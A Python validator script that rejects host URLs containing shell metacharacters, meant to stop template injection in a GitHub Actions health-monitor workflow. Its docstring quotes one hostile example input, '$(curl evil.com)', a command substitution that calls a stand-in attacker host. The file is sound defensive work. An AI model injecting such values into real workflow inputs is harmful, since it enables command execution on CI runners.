#!/usr/bin/env python3
"""Validate that a host URL is safe to use (no shell metacharacters).

Used by .github/workflows/health-monitor.yml to prevent template-injection (issue #406).
A malicious workflow_dispatch input like $(curl evil.com) is rejected.

Usage: python3 scripts/validate_host.py <URL>
Exit 0 = valid, exit 1 = invalid/rejected.
"""
import re
import sys

URL_PATTERN = re.compile(
    r'^https?://'
    r'[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?'
    r'([a-zA-Z0-9.-]*[a-zA-Z0-9])?'
    r'(:\d+)?'
    r'(/[a-zA-Z0-9-._/]*)?$'
)

def is_safe_host(host: str) -> bool:
    """Return True if host matches a safe URL pattern."""
    if not host or len(host) > 2048:
        return False
    return bool(URL_PATTERN.match(host))

def main():
    if len(sys.argv) != 2:
        print("Usage: validate_host.py <URL>", file=sys.stderr)
        sys.exit(2)
    host = sys.argv[1]
    if is_safe_host(host):
        print(f"OK: valid host — {host}")
        sys.exit(0)
    else:
        print(f"ERROR: host no válido o posible template-injection — {host}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
